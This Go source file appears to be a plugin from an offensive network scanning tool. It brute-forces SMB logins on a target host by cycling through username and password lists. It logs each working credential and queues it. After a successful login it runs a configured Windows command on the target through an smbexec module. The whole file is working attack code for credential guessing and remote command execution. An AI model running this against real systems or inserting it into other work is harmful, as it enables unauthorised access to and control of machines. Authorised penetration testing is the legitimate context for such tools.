package plugins

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	"github.com/404tk/lazyscan/common"
	"github.com/404tk/lazyscan/pkg/schema/smbexec"
	"github.com/hirochachacha/go-smb2"
)

func SMBScan(info *common.HostInfo) error {
	starttime := time.Now().Unix()
	for _, user := range info.Usernames {
		for _, pass := range info.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			flag, err := SMBConn(info, user, pass)
			if flag == true && err == nil {
				return err
			} else {
				if time.Now().Unix()-starttime > (int64(len(info.Usernames)*len(info.Passwords)) * info.Timeout) {
					return errors.New("timeout.")
				}
			}
		}
	}
	return nil
}

func SMBConn(info *common.HostInfo, user string, pass string) (flag bool, err error) {
	conn, err := net.DialTimeout(
		"tcp", fmt.Sprintf("%s:%s", info.Host, info.Port),
		time.Duration(info.Timeout)*time.Second)
	if err != nil {
		return flag, err
	}
	defer conn.Close()
	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			//Domain:   domain,
			User:     user,
			Password: pass,
		}}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(info.Timeout)*time.Second)
	defer cancel()
	s, err := d.DialContext(ctx, conn)
	if err == nil {
		s.Logoff()
		flag = true
		result := fmt.Sprintf("[%s:%s] SMB credential %s/%s", info.Host, info.Port, user, pass)
		log.Println(result)
		if info.Queue != nil {
			vuln := common.Vuln{
				Host: info.Host,
				Port: info.Port,
				User: user,
				Pass: pass,
			}
			info.Queue.Push(vuln)
		}
		cmd := info.Command.WinCommand
		smbexec.SMBExec(info, user, pass, cmd)
	}
	return flag, err
}
